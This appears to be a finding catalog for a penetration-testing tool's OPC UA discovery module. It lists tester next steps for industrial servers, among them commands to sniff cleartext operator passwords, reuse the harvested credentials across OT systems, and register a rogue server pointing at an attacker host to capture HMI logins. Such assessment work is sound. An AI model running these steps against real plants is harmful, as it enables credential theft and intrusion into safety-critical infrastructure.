summary: OPC UA module is a T1-heavy discovery probe with strong findings. Anonymous UserTokenPolicy detection, SecurityMode=None, cleartext credentials over None-policy, deprecated crypto policies, self-signed / weak-key certificate, open LDS RegisterServer are all deterministic T1 posture. Gap: does not actually establish a Session (CreateSession + ActivateSession + Browse) — that would move anonymous_allowed from T1 (advertised) to T2 (session-opened). Also no username bruteforce (deferred by design; needs RSA-OAEP against server cert).

findings.title_pattern: OPC UA server reachable on OT/enterprise segment
findings.tier_evidence: uacp HELLO/ACK is deterministic OPC UA fingerprint.
findings.tester_next_step: opcua-client discover opc.tcp://<ip>:4840; opcua-client get-endpoints opc.tcp://<ip>:4840.

findings.promotion_notes: Feeds all other findings; T0 by nature.
findings.tester_next_step: For each endpoint URL, opcua-client connect --security-mode None --user-anonymous <endpoint>; then Browse RootFolder recursively.

findings.title_pattern: OPC UA endpoint allows Anonymous user identity
findings.tier_evidence: UserTokenPolicy tokenType=Anonymous advertised in EndpointDescription — deterministic policy.
findings.promotion_notes: Establish anonymous CreateSession + ActivateSession + Read(NodeId 2258 ServerStatus) — a successful Read is T2 proof anonymous browse works. Requires SessionAuthenticationToken plumbing.
findings.tester_next_step: opcua-client browse --anonymous opc.tcp://<ip>:4840/ i=84; if browse returns children, opcua-client read --anonymous opc.tcp://<ip>:4840/ 'ns=0;i=2258' (ServerStatus) — dumps SDK build, start-time, current-time — proves anon session works.

findings.title_pattern: OPC UA endpoint offers SecurityMode=None (unencrypted channel)
findings.promotion_notes: Open a channel with SecurityMode=None and Browse — successful browse is proof; already covered by opcua_anonymous_allowed promotion when both apply.
findings.tester_next_step: opcua-client connect --none opc.tcp://<ip>:4840 && tcpdump -w /tmp/ua.pcap -i any 'host <ip> and port 4840' && Wireshark decode-as OPCUA — observe cleartext ReadResponse bodies.

findings.title_pattern: OPC UA endpoint accepts UserName tokens over None security policy (cleartext credentials)
findings.tier_evidence: UserTokenPolicy UserName with policy_uri=None on a None-mode endpoint — deterministic exposure of password field on wire.
findings.promotion_notes: Passive PCAP capture during a legitimate login yields cleartext credentials → T3 initial access on that account. Not something recce can force.
findings.tester_next_step: tcpdump -w /tmp/ua.pcap 'host <ip> and port 4840'; wait for legitimate operator login; extract password from ActivateSessionRequest.UserIdentityToken (visible ASCII in the None-policy path). Attempt harvested creds against every OT system.

findings.title_pattern: OPC UA endpoint offers deprecated security policy (Basic128Rsa15 / Basic256)
findings.tier_evidence: SecurityPolicyUri equal to a documented-deprecated policy — deterministic.
findings.promotion_notes: Bleichenbacher-style attacks on PKCS#1 v1.5 padding are theoretical against this profile; not practical.
findings.tester_next_step: Confirm the deprecated policy is actually usable by opening a channel with it: opcua-client connect --policy Basic128Rsa15 opc.tcp://<ip>:4840.

findings.title_pattern: OPC UA server discloses application and product identity (vendor fingerprint)
findings.promotion_notes: Map productUri to known OPC UA SDK CVEs (open62541, UA-.NETStandard, prosys, Softing) — issue advisory-matched T1 findings.
findings.tester_next_step: Correlate productUri against CVE feed; e.g. open62541 CVE-2021-46882, ProSys UA SDK advisories. Check the vendor's web UI on 80/443 for default creds.

findings.title_pattern: OPC UA server certificate is self-signed / weak-key OR captured
findings.tier_evidence: Cert DER parsed, self-signed / weak-key derived from actual key_bits — deterministic property.
findings.promotion_notes: Certificate policy findings are inherently posture — no ethical promotion.
findings.tester_next_step: openssl x509 -in server.der -inform DER -noout -text; check for shared factory-default cert (hash collision across many devices in engagement).

findings.title_pattern: OPC UA FindServers enumerated sibling servers and internal discoveryUrls
findings.tier_evidence: FindServers returns real sibling ApplicationDescriptions — deterministic enumeration.
findings.promotion_notes: Follow each discoveryUrl and re-probe — each is a new OT target to enumerate.
findings.tester_next_step: For each url returned: opcua-client discover <url>; enumerate the sibling.

findings.title_pattern: OPC UA LDS-ME exposes network-wide server inventory (FindServersOnNetwork)
findings.tier_evidence: FindServersOnNetwork returns mDNS-registered records — real network inventory.
findings.promotion_notes: Use each discovery URL as a new target; use serverCapabilityFilter to narrow to LDS/DA servers.
findings.tester_next_step: For each record's discovery_url: opcua-client get-endpoints <url> to build the site-wide OPC UA inventory.

findings.title_pattern: OPC UA Discovery Server accepts unauthenticated RegisterServer (rogue-server primitive)
findings.tier_evidence: RegisterServerRequest with anonymous/None channel returned Good (service_result=0) — deterministic policy failure.
findings.promotion_notes: T3 chain: register a rogue server pointing at attacker IP; wait for auto-connecting clients (engineering stations, HMIs) to CreateSession → capture UserName tokens (with None policy that's cleartext). Requires runtime infrastructure not in recce scope.
findings.tester_next_step: Launch attacker OPC UA server (open62541 server_ctt) on attacker IP; opcua-client register-server opc.tcp://<lds>:4840 --serverUri urn:evil --discoveryUrl opc.tcp://<attacker>:4840/. Wait for HMI connections in Wireshark; harvest UserName tokens.

findings.title_pattern: OPC UA server leaks SDK / product version in ERR message
findings.tier_evidence: Reason string from ERR frame — fingerprint only.
findings.promotion_notes: If reason names a specific SDK+version, cross-reference to SDK CVEs.
findings.tester_next_step: printf '\x48\x45\x4cF' | nc <ip> 4840 | xxd; correlate the reason string with open62541 / UA-.NETStandard / Softing SDK CVE feed.
